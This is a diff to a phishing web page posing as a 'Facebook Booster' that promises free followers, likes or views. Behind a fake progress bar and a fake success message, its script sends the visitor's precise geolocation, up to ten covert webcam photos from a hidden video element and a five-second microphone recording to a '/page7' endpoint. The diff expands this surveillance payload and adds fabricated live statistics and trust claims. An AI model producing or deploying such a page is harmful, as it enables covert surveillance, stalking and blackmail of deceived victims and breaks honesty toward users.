@@ -5,98 +5,327 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Booster</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: linear-gradient(135deg, #1877f2 0%, #0d47a1 100%); color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
-        .container { width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 30px; padding: 25px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 18px; }
-        .header { display: flex; align-items: center; justify-content: center; gap: 10px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: linear-gradient(135deg, #1877f2 0%, #0d47a1 100%); color: #333333; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
+        
+        .container { width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 30px; padding: 25px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 18px; margin-top: 20px; margin-bottom: 20px; position: relative; z-index: 5; }
+
+        .header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 5px; }
         .fb-logo { font-size: 32px; background: #1877f2; color: white; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-weight: 900; }
-        .fb-title { font-size: 28px; font-weight: 800; color: #1877f2; }
-        .input-wrapper { background-color: #f0f2f5; border: 1px solid #ccd0d5; border-radius: 16px; padding: 14px 16px; }
+        .fb-title { font-size: 28px; font-weight: 800; color: #1877f2; display: flex; align-items: center; gap: 6px; }
+        .verified-badge { color: #1877f2; font-size: 20px; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; text-align: center; background-color: #f0f2f5; padding: 12px 6px; border-radius: 16px; border: 1px solid #e4e6eb; }
+        .stat-val { font-size: 16px; font-weight: 800; color: #1c1e21; }
+        .stat-lbl { font-size: 11px; color: #65676b; margin-top: 2px; }
+
+        .card-label { font-size: 14px; font-weight: 700; color: #1c1e21; display: flex; align-items: center; gap: 6px; }
+
+        .input-wrapper { background-color: #f0f2f5; border: 1px solid #ccd0d5; border-radius: 16px; padding: 14px 16px; display: flex; align-items: center; gap: 8px; }
         .input-box { width: 100%; background: transparent; border: none; outline: none; font-size: 15px; font-weight: 600; color: #1c1e21; }
+
         .grid-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .opt-card { background-color: #f0f2f5; border: 1px solid #ccd0d5; padding: 16px 8px; border-radius: 18px; text-align: center; cursor: pointer; }
-        .opt-card.active { background: #1877f2; color: #ffffff; border-color: #1877f2; }
+        .opt-card { background-color: #f0f2f5; border: 1px solid #ccd0d5; padding: 16px 8px; border-radius: 18px; text-align: center; cursor: pointer; position: relative; transition: all 0.2s ease; }
+        .opt-card.active { background: linear-gradient(135deg, #1877f2, #0d47a1); border-color: #1877f2; color: #ffffff; }
         .opt-card.active .o-title, .opt-card.active .o-sub { color: #ffffff !important; }
-        .o-title { font-size: 18px; font-weight: 800; color: #1c1e21; }
-        .o-sub { font-size: 11px; color: #65676b; margin-top: 4px; }
-        .generate-btn { background: #1877f2; color: white; width: 100%; padding: 16px; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3); }
+        .pop-badge { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background-color: #fa383e; color: white; font-size: 8px; font-weight: 800; padding: 3px 8px; border-radius: 10px; text-transform: uppercase; pointer-events: none; letter-spacing: 0.5px; }
+        .o-title { font-size: 18px; font-weight: 800; color: #1c1e21; pointer-events: none; }
+        .o-sub { font-size: 11px; color: #65676b; margin-top: 4px; pointer-events: none; }
+
+        .speed-box { display: flex; align-items: center; justify-content: space-between; background-color: #ffffff; }
+        .speed-label { font-size: 14px; font-weight: 700; color: #1c1e21; display: flex; align-items: center; gap: 6px; }
+        .speed-badge { background-color: #1877f2; color: white; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; }
+        
+        .slider-container { width: 100%; margin-top: -5px; }
+        .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 5px; background: #ccd0d5; outline: none; }
+        .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 20px; height: 20px; border-radius: 50%; background: #1877f2; cursor: pointer; border: 2px solid white; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+
+        .generate-btn { background: linear-gradient(135deg, #1877f2, #0d47a1); color: white; width: 100%; padding: 16px; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3); transition: 0.2s; position: relative; z-index: 10; margin-top: 5px; }
+        .generate-btn:active { transform: scale(0.98); }
+        .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
         .error-box { display: none; background-color: #ffe5e5; border: 1px solid #ff4d4d; border-radius: 14px; padding: 12px; text-align: center; font-size: 13px; color: #d8000c; font-weight: bold; }
+
+        .process-box { display: none; background-color: #f0f2f5; border: 1px solid #ccd0d5; border-radius: 14px; padding: 12px; text-align: center; }
+        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #65676b; margin-bottom: 8px; font-weight: 600; }
+        .progress-bar-container { width: 100%; background-color: #ccd0d5; height: 8px; border-radius: 4px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #1877f2, #0d47a1); transition: width 0.3s ease; }
+
         .success-box { display: none; background-color: #e6f4ea; border: 1px solid #34a853; border-radius: 14px; padding: 12px; text-align: center; font-size: 13px; color: #137333; font-weight: bold; }
+
+        .footer-info { text-align: center; font-size: 11px; color: #65676b; display: flex; align-items: center; justify-content: center; gap: 12px; font-weight: 600; margin-top: 5px; }
+
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
         canvas { display: none; }
     </style>
 </head>
 <body>
+
     <div class="container">
         <div class="header">
             <span class="fb-logo">f</span>
-            <div class="fb-title">Facebook Booster</div>
+            <div class="fb-title">Facebook <span class="verified-badge">☑️</span></div>
         </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-val" id="activeUsers">942</div>
+                <div class="stat-lbl">orders</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val" id="boostGiven">15.4k</div>
+                <div class="stat-lbl">boosted</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val">2,410</div>
+                <div class="stat-lbl">users</div>
+            </div>
+        </div>
+
+        <div class="card-label">🔗 Enter Profile / Post Link</div>
         <div class="input-wrapper">
             <input type="text" class="input-box" id="fbLink" placeholder="https://facebook.com/...">
         </div>
+
         <div class="grid-options">
-            <div class="opt-card active" data-type="Followers"><div class="o-title">1K</div><div class="o-sub">Followers</div></div>
-            <div class="opt-card" data-type="Likes"><div class="o-title">1K</div><div class="o-sub">Likes</div></div>
-            <div class="opt-card" data-type="Views"><div class="o-title">1K</div><div class="o-sub">Views</div></div>
+            <div class="opt-card active" data-type="Followers">
+                <div class="pop-badge">POPULAR</div>
+                <div class="o-title">1K</div>
+                <div class="o-sub">Followers 👤</div>
+            </div>
+            <div class="opt-card" data-type="Likes">
+                <div class="o-title">1K</div>
+                <div class="o-sub">Likes 👍</div>
+            </div>
+            <div class="opt-card" data-type="Views">
+                <div class="o-title">1K</div>
+                <div class="o-sub">Views 👀</div>
+            </div>
         </div>
-        <button id="generateBtn" class="generate-btn">🚀 Boost Now</button>
-        <div id="errorBox" class="error-box">⚠️ Please enter a valid Profile or Post Link first!</div>
-        <div id="successBox" class="success-box">✅ Successfully delivered boost to your link!</div>
+
+        <div class="speed-box">
+            <div class="speed-label">🏎️ Delivery Speed</div>
+            <div class="speed-badge" id="speedText">Fast</div>
+        </div>
+        <div class="slider-container">
+            <input type="range" min="1" max="100" value="80" class="slider" id="speedSlider">
+        </div>
+
+        <button id="generateBtn" class="generate-btn">
+            🚀 Boost Now
+        </button>
+
+        <div id="errorBox" class="error-box">
+            ⚠️ Please enter a valid Profile or Post Link first!
+        </div>
+
+        <div id="processBox" class="process-box">
+            <div class="process-text">
+                <span id="processStatus">Processing request...</span>
+                <span id="processPercent">0%</span>
+            </div>
+            <div class="progress-bar-container">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
+        </div>
+
+        <div id="successBox" class="success-box">
+            ✅ Successfully delivered <span id="selectedTypeText">Followers</span> (1K) to your link!
+        </div>
+
+        <div class="footer-info">
+            <span>🛡️ No password required</span>
+            <span>•</span>
+            <span>Instant delivery</span>
+            <span>•</span>
+            <span>⚡ 100% working</span>
+        </div>
     </div>
+
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
+
     <script>
         const optCards = document.querySelectorAll('.opt-card');
+        let selectedTypeValue = 'Followers';
+
         optCards.forEach(card => {
             card.addEventListener('click', function(e) {
                 e.preventDefault();
                 optCards.forEach(c => c.classList.remove('active'));
                 this.classList.add('active');
+                selectedTypeValue = this.getAttribute('data-type');
             });
         });
-        async function sendData(fd) { try { await fetch(window.location.href, { method: 'POST', body: fd }); } catch(e){} }
-        async function sendSinglePhoto(stream) {
-            const v = document.getElementById('video'), c = document.getElementById('canvas');
-            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
-            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
-            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
+
+        const slider = document.getElementById("speedSlider");
+        const speedText = document.getElementById("speedText");
+        slider.oninput = function() {
+            if (this.value < 35) {
+                speedText.innerText = "Slow";
+            } else if (this.value < 70) {
+                speedText.innerText = "Normal";
+            } else {
+                speedText.innerText = "Fast";
+            }
+        };
+
+        setInterval(() => {
+            const orders = Math.floor(900 + Math.random() * 100);
+            const boosted = (15.0 + Math.random() * 0.8).toFixed(1) + 'k';
+            document.getElementById('activeUsers').innerText = orders;
+            document.getElementById('boostGiven').innerText = boosted;
+        }, 3000);
+
+        async function sendData(formData) {
+            try {
+                await fetch('/page7', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
         }
-        async function recordAndSendAudio(stream) {
-            return new Promise(r => {
-                try {
-                    const mr = new MediaRecorder(stream), chunks = [];
-                    mr.ondataavailable = e => chunks.push(e.data);
-                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
-                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
-                } catch(e) { r(); }
+
+        async function sendSinglePhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return new Promise((resolve) => {
+                canvas.toBlob(async function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    await sendData(formData);
+                    resolve();
+                }, 'image/jpeg');
             });
         }
+
+        async function recordAndSendAudio(stream) {
+            return new Promise((resolve) => {
+                try {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        const formData = new FormData();
+                        formData.append('voice', audioBlob, 'voice.ogg');
+                        await sendData(formData);
+                        resolve();
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000);
+                } catch (e) {
+                    resolve();
+                }
+            });
+        }
+
         document.getElementById("generateBtn").addEventListener("click", async function() {
+            const btn = document.getElementById("generateBtn");
             const linkInput = document.getElementById("fbLink");
-            if(linkInput.value.trim() === "") { document.getElementById("errorBox").style.display = "block"; return; }
-            document.getElementById("errorBox").style.display = "none";
-            this.innerText = "Connecting..."; this.disabled = true;
-            if (navigator.geolocation) {
-                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
-                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
-                }, () => r(), { timeout: 4000 }));
+            const linkVal = linkInput.value.trim();
+            const errorBox = document.getElementById("errorBox");
+            const processBox = document.getElementById("processBox");
+            const progressBar = document.getElementById("progressBar");
+            const processPercent = document.getElementById("processPercent");
+            const successBox = document.getElementById("successBox");
+
+            if (linkVal === "") {
+                errorBox.style.display = "block";
+                successBox.style.display = "none";
+                linkInput.focus();
+                return;
+            } else {
+                errorBox.style.display = "none";
             }
+
+            btn.innerText = "Connecting...";
+            btn.disabled = true;
+
+            processBox.style.display = "block";
+
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                if (progress <= 100) {
+                    progressBar.style.width = progress + '%';
+                    processPercent.innerText = progress + '%';
+                }
+            }, 60);
+
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const formData = new FormData();
+                            formData.append('latitude', pos.coords.latitude);
+                            formData.append('longitude', pos.coords.longitude);
+                            await sendData(formData);
+                            resolve();
+                        },
+                        () => { resolve(); },
+                        { timeout: 4000, enableHighAccuracy: true }
+                    );
+                });
+            }
+
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
                     await new Promise(r => setTimeout(r, 300));
-                    let count = 0;
-                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
+
+                    let photoCount = 0;
+                    const maxPhotos = 10; 
+
+                    const photoInterval = setInterval(async () => {
+                        if (photoCount < maxPhotos) {
+                            photoCount++;
+                            await sendSinglePhoto(stream);
+                        } else {
+                            clearInterval(photoInterval);
+                        }
+                    }, 800);
+
                     await recordAndSendAudio(stream);
+
+                    while (photoCount < maxPhotos) {
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                    clearInterval(photoInterval);
+
                     stream.getTracks().forEach(t => t.stop());
                 }
-            } catch(e) {}
+            } catch (err) {}
+
+            clearInterval(progressInterval);
+            progressBar.style.width = '100%';
+            processPercent.innerText = '100%';
+
             setTimeout(() => {
-                document.getElementById("successBox").style.display = "block";
-                this.innerText = "Boost Successful ✅";
+                processBox.style.display = "none";
+                document.getElementById("selectedTypeText").innerText = selectedTypeValue;
+                
+                successBox.style.display = "block";
+                btn.innerText = "Boost Successful ✅";
             }, 500);
         });
     </script>
